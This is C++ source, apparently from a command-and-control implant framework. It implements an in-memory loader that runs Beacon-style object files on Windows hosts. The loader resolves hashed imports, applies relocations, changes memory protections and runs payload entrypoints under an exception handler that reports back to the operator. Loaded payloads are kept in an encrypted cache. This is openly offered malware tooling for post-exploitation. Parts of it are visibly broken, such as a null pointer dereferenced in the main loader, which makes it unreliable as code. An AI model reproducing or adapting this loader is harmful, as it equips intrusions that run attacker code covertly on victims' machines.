#include <core/include/objects.hpp>

using namespace Hash;
using namespace Xtea;
using namespace Utils;
using namespace Opsec;
using namespace Stream;
using namespace Dispatcher;
using namespace Utils::Scanners;
using namespace Memory::Methods;

namespace Objects {

    PVOID __attribute__((used, section(".data"))) wrapper_return = nullptr;
    // TODO: add common BOF/internal implant functions
    HASH_MAP __attribute__((used, section(".rdata"))) internal_map[] = {
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
    };

    HASH_MAP __attribute__((used, section(".rdata"))) bof_map[] = {
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
    };

    LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exception) {

        _stream *stream = CreateTaskResponse(TypeError);
        exception->ContextRecord->IP_REG = U_PTR(wrapper_return);

        PackUint32(stream, ERROR_UNHANDLED_EXCEPTION);
        PackUint32(stream, exception->ExceptionRecord->ExceptionCode);
        PackPointer(stream, C_PTR(U_PTR(exception->ExceptionRecord->ExceptionAddress)));

        MessageQueue(stream);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    VOID WrapperFunction(VOID *address, VOID *args, SIZE_T size) {

        auto function = (OBJ_ENTRY) address;

        wrapper_return = __builtin_extract_return_addr(__builtin_return_address(0));
        function((CHAR*)args, size);
    }

    BOOL ProcessSymbol(CHAR* sym_string, VOID **pointer) {

        CHAR *function  = nullptr;

        // __imp_Beacon
        *pointer = nullptr;
        if (HashStringA(sym_string, COFF_PREP_BEACON_SIZE) == COFF_PREP_BEACON) {

            function = sym_string + COFF_PREP_BEACON_SIZE;
            return MapScan(bof_map, HashStringA(function, MbsLength(function)), pointer);
        }
        // __imp_
        if (HashStringA(sym_string, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
            BOOL import = StringChar(sym_string, '$', MbsLength(sym_string));

            if (import) {
                CHAR buffer[MAX_PATH] = { };

                auto count = 0;
                auto split = NewSplit(sym_string + COFF_PREP_SYMBOL_SIZE, "$", &count);
#ifdef _M_IX86
                Trim(split[1], '@');
#endif
                auto lib_hash   = HashStringA(MbsToLower(buffer, split[0]), MbsLength(split[0]));
                auto fn_hash    = HashStringA(MbsToLower(buffer, split[1]), MbsLength(split[1]));

                FreeSplit(split, count);
                C_PTR_HASHES(*pointer, lib_hash, fn_hash);

                return *pointer ? true : false;
            }

            function = sym_string + COFF_PREP_SYMBOL_SIZE;
            Trim(function, '@');

            return MapScan(internal_map, HashStringA(function, MbsLength(function)), pointer);
        }
        // .refptr.__instance
        if (HashStringA(sym_string, MbsLength(sym_string)) == COFF_INSTANCE) {

            *pointer = (_hexane*) C_DREF(GLOBAL_OFFSET);
            return *pointer ? true : false;
        }

        return false;
    }

    BOOL ExecuteFunction(EXECUTABLE *image, const CHAR *entry, VOID *args, CONST SIZE_T size) {
        HEXANE;

        VOID *veh_handle = nullptr;
        VOID *entrypoint = nullptr;
        CHAR *sym_name = nullptr;
        BOOL success = false;

        const auto file_head = image->nt_head->FileHeader;

        // NOTE: register veh as execution safety net
        if (!(veh_handle = ctx->win32.RtlAddVectoredExceptionHandler(1, &ExceptionHandler))) {
            goto defer;
        }

        // NOTE: set section memory attributes
        for (auto sec_index = 0; sec_index < file_head.NumberOfSections; sec_index++) {
            const auto section  = ITER_SECTION_HEADER(image->buffer, sec_index);

            if (section->SizeOfRawData > 0) {
                UINT32 protect = 0;

                switch (section->Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)) {
                    case PAGE_NOACCESS:         protect = PAGE_NOACCESS; break;
                    case IMAGE_SCN_MEM_EXECUTE: protect = PAGE_EXECUTE; break;
                    case IMAGE_SCN_MEM_READ:    protect = PAGE_READONLY; break;
                    case IMAGE_SCN_MEM_WRITE:   protect = PAGE_WRITECOPY; break;
                    case IMAGE_SCN_MEM_RX:      protect = PAGE_EXECUTE_READ; break;
                    case IMAGE_SCN_MEM_WX:      protect = PAGE_EXECUTE_WRITECOPY; break;
                    case IMAGE_SCN_MEM_RW:      protect = PAGE_READWRITE; break;
                    case IMAGE_SCN_MEM_RWX:     protect = PAGE_EXECUTE_READWRITE; break;
                    default:
						goto defer;
                }

                if ((section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) == IMAGE_SCN_MEM_NOT_CACHED) {
                    protect |= PAGE_NOCACHE;
                }
                if (!NT_SUCCESS(ntstatus = ctx->win32.NtProtectVirtualMemory(NtCurrentProcess(), (VOID**)&image->sec_map[sec_index].address, &image->sec_map[sec_index].size, protect, nullptr))) {
                    goto defer;
                }
            }
        }

        if (image->fn_map->size) {
            if (!NT_SUCCESS(ntstatus = ctx->win32.NtProtectVirtualMemory(NtCurrentProcess(), (VOID**)&image->fn_map->address, &image->fn_map->size, PAGE_READONLY, nullptr))) {
                goto defer;
            }
        }

        // NOTE: get names from COFF symbol table and find entrypoint
        for (auto sym_index = 0; sym_index < file_head.NumberOfSymbols; sym_index++) {
            const auto symbols = image->symbols;

            if (symbols[sym_index].First.Value[0]) {
                sym_name = symbols[sym_index].First.Name; // inlined
            } else {
                sym_name = (CHAR*)(symbols + file_head.NumberOfSymbols) + symbols[sym_index].First.Value[1]; // not inlined
            }

            // NOTE: compare symbols to entry names / entrypoint
            if (MemCompare(sym_name, entry, MbsLength(entry)) == 0) {
                entrypoint = image->sec_map[symbols[sym_index].SectionNumber - 1].address + symbols[sym_index].Value;
            }
        }

        // NOTE: find section where entrypoint can be found and assert is RX
        for (auto sec_index = 0; sec_index < file_head.NumberOfSections; sec_index++) {
            if (entrypoint >= image->sec_map[sec_index].address && entrypoint < image->sec_map[sec_index].address + image->sec_map[sec_index].size) {

                const auto section = ITER_SECTION_HEADER(image->buffer, sec_index);
                if ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != IMAGE_SCN_MEM_EXECUTE) {
                    goto defer;
                }
            }
        }

        WrapperFunction(entrypoint, args, size);
        success = true;

        defer:
        if (veh_handle) {
            ctx->win32.RtlRemoveVectoredExceptionHandler(veh_handle);
        }

        return success;
    }

    BOOL BaseRelocation(_executable *image) {

        CHAR sym_name[9] = { };
        CHAR *name_ptr = nullptr;

        UINT32 fn_count = 0;
        BOOL success = false;

        for (auto sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
            VOID *function = nullptr;

            const auto section = ITER_SECTION_HEADER(image->buffer, sec_index);
            auto reloc = RVA(RELOC*, image->buffer, section->PointerToRelocations);

            for (auto rel_index = 0; rel_index < section->NumberOfRelocations; rel_index++) {
                const auto head = &image->symbols[reloc->SymbolTableIndex];

                if (head->First.Value[0]) {
                    MemSet(sym_name, 0, 9);
                    MemCopy(sym_name, head->First.Name, 8);
                    name_ptr = sym_name;
                } else {
                    name_ptr = (CHAR*) (image->symbols + image->nt_head->FileHeader.NumberOfSymbols) + head->First.Value[1];
                }

                VOID *reloc_addr    = image->sec_map[sec_index].address + reloc->VirtualAddress;
                VOID *sec_addr      = image->sec_map[head->SectionNumber - 1].address;
                VOID *fn_addr       = image->fn_map + (fn_count * sizeof(VOID*));

                if (!ProcessSymbol(name_ptr, &function)) {
                    goto defer;
                }
#if _WIN64
                if (function) {
                    switch (reloc->Type) {
                        case IMAGE_REL_AMD64_REL32: {
                            *(VOID**)fn_addr = function;
                            *(UINT32*)reloc_addr = U_PTR(fn_addr) - U_PTR(reloc_addr) - sizeof(uint32);
							break;
                        }
                        default:
							break;

                    }
                }
                else {
                    switch (reloc->Type) {
					case IMAGE_REL_AMD64_REL32:     *(UINT32*) reloc_addr = *(UINT32*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(UINT32); break;
					case IMAGE_REL_AMD64_REL32_1:   *(UINT32*) reloc_addr = *(UINT32*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(UINT32) - 1; break;
					case IMAGE_REL_AMD64_REL32_2:   *(UINT32*) reloc_addr = *(UINT32*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(UINT32) - 2; break;
					case IMAGE_REL_AMD64_REL32_3:   *(UINT32*) reloc_addr = *(UINT32*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(UINT32) - 3; break;
					case IMAGE_REL_AMD64_REL32_4:   *(UINT32*) reloc_addr = *(UINT32*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(UINT32) - 4; break;
					case IMAGE_REL_AMD64_REL32_5:   *(UINT32*) reloc_addr = *(UINT32*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(UINT32) - 5; break;
					case IMAGE_REL_AMD64_ADDR32NB:  *(UINT32*) reloc_addr = *(UINT32*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(UINT32); break;
					case IMAGE_REL_AMD64_ADDR64:    *(UINT64*) reloc_addr = *(UINT64*) reloc_addr + U_PTR(sec_addr); break;
                    default:
                        break;
                    }
                }
#else
                if (function) {
                    switch (reloc_addr->Type) {
                        case IMAGE_REL_I386_DIR32: {
                            *(VOID**) fn_addr = function;
                            *(UINT32*) reloc_addr = U_PTR(fn_addr);
							break;
                        }
                        default:
							break;
                    }
                }
                else {
                    switch (reloc_addr->Type) {
					case IMAGE_REL_I386_DIR32: *(UINT32*)reloc_addr = (*(UINT32*)reloc_addr) + U_PTR(sec_addr); break;
					case IMAGE_REL_I386_REL32: *(UINT32*)reloc_addr = (*(UINT32*)reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(UINT32); break;
                    default:
                        break;
                    }
                }
#endif
                reloc += sizeof(RELOC);
            }
        }

        success = true;

        defer:
        return success;
    }

    SIZE_T FindFunctionMapSize(EXECUTABLE *image) {

        char sym_name[9] = { };
        int counter = 0;

        for (auto sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
            const auto section = ITER_SECTION_HEADER(image->buffer, sec_index);
            auto reloc = RVA(RELOC*, image->buffer, image->section->PointerToRelocations);

            for (auto rel_index = 0; rel_index < section->NumberOfRelocations; rel_index++) {
                const auto symbols = image->symbols;
                CHAR *buffer = nullptr;

                if (_coff_symbol *symbol = &symbols[reloc->SymbolTableIndex]; symbol->First.Value[0]) {
                    MemSet(sym_name, 0, sizeof(sym_name));
                    MemCopy(sym_name, symbol->First.Name, 8);
                    buffer = sym_name;
                } else {
                    buffer = RVA(CHAR*, symbols, image->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                }
                if (HashStringA(buffer, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
                    counter++;
                }

                reloc = reloc + sizeof(_reloc);
            }
        }

        return sizeof(VOID*) * counter;
    }

    VOID AddCOFF(_coff_params *bof) {
        HEXANE;

        _coff_params *head = ctx->bof_cache;

        if (ENCRYPTED) {
            XteaCrypt((UINT8*) bof->data, bof->data_size, ctx->config.session_key, true);
            XteaCrypt((UINT8*) bof->args, bof->args_size, ctx->config.session_key, true);
            XteaCrypt((UINT8*) bof->entrypoint, bof->entrypoint_length, ctx->config.session_key, true);
        }

        if (!ctx->bof_cache) {
            ctx->bof_cache = bof;
        }
        else {
            do {
                if (head->next) {
                    head = head->next;
                }
                else {
                    head->next = bof;
                    break;
                }
            }
            while (true);
        }
    }

    COFF_PARAMS* FindCOFF(CONST UINT32 bof_id) {
        HEXANE;

        auto head = ctx->bof_cache;
        // NOTE: coff_id will be a known name hash

        do {
            if (head) {
                if (head->bof_id == bof_id) {
                    if (ENCRYPTED) {
                        XteaCrypt((UINT8*)head->data, head->data_size, ctx->config.session_key, false);
                        XteaCrypt((UINT8*)head->args, head->args_size, ctx->config.session_key, false);
                        XteaCrypt((UINT8*)head->entrypoint, head->entrypoint_length, ctx->config.session_key, false);
                    }

                    return head;
                }

                head = head->next;
            } else {
                return nullptr;
            }
        }
        while (true);
    }

    VOID RemoveCOFF(const uint32 bof_id) {
        HEXANE;

        _coff_params *prev = { };

        if (!bof_id) {
            return;
        }

        for (auto head = ctx->bof_cache; head; head = head->next) {
            if (head->bof_id == bof_id) {

                if (prev) {
                    prev->next = head->next;
                } else {
                    ctx->bof_cache = head->next;
                }

                MemSet(head->data, 0, head->data_size);
                MemSet(head->args, 0, head->args_size);
                MemSet(head->entrypoint, 0, head->entrypoint_length);

                Free(head->data);
                Free(head->args);
                Free(head->entrypoint);
                Free(head);

                return;
            }

            prev = head;
        }
    }

    VOID Cleanup(_executable *image) {
        HEXANE;

        if (!image || !image->base) {
            return;
        }
        if (!NT_SUCCESS(ctx->win32.NtProtectVirtualMemory(NtCurrentProcess(), (void **) &image->base, &image->buf_size, PAGE_READWRITE, nullptr))) {
            // LOG ERROR
            return;
        }

        MemSet((void*) image->base, 0, image->base_size);

        VOID *pointer = (VOID*) image->base;
        SIZE_T size = image->buf_size;

        if (!NT_SUCCESS(ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &pointer, &size, MEM_RELEASE))) {
            // LOG ERROR
            return;
        }

        if (image->sec_map) {

            MemSet(image->sec_map, 0, image->nt_head->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
            Free(image->sec_map);
            image->sec_map = nullptr;
        }

        MemSet(image, 0, sizeof(EXECUTABLE));
        Free(image);
    }

    VOID COFFLoader(CHAR *entrypoint, VOID *data, VOID *args, SIZE_T args_size) {
        HEXANE;
        // NOTE: sec_map seems to be the only thing that persists
		// TODO: this no longer exists. Apply new.

		EXECUTABLE *image = nullptr;
        //EXECUTABLE image = CreateImage((uint8 *) data);

        auto next     = (UINT8*) image->base;
        BOOL success  = true;

        x_assertb(image->buffer    = (UINT8*) data);
        x_assertb(image->sec_map   = (OBJECT_MAP *) Malloc(sizeof(VOID*) * sizeof(OBJECT_MAP)));
        x_assertb(ImageCheckArch(image));

        image->fn_map->size = FindFunctionMapSize(image);
        image->base_size += image->fn_map->size;

        // NOTE: calculating address/size of sections before base relocation
        for (UINT16 sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
            const auto section = ITER_SECTION_HEADER(image->buffer, sec_index);

            image->base_size += section->SizeOfRawData;
            image->base_size = (SIZE_T) PAGE_ALIGN(image->base_size);
        }

        // NOTE: allocate space for sections
        x_ntassertb(ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (VOID**)&image->base, image->base_size, &image->base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

        for (UINT16 sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
            const auto section = ITER_SECTION_HEADER(image->buffer, sec_index);

            // NOTE: every section will be assigned here before base relocation
            image->sec_map[sec_index].size    = section->SizeOfRawData;
            image->sec_map[sec_index].address = next;

            next += image->section->SizeOfRawData;
            next = PAGE_ALIGN(next);

            MemCopy(image->sec_map[sec_index].address, RVA(PBYTE, image->buffer, image->section->SizeOfRawData), image->section->SizeOfRawData);
        }

        // NOTE: function map goes after the section map ?
        image->fn_map = (OBJECT_MAP*) next;

        x_assertb(BaseRelocation(image));
        x_assertb(ExecuteFunction(image, entrypoint, args, args_size));

        defer:
        if (success) {
            // LOG SUCCESS (?)
        } else {
            // LOG ERROR
        }

        if (image) {
            Cleanup(image);
        }
    }

    VOID COFFThread(_coff_params *coff) {

        if (!coff->entrypoint || !coff->data) {
            return;
        }

        COFFLoader(coff->entrypoint, coff->data, coff->args, coff->args_size);
    }
}
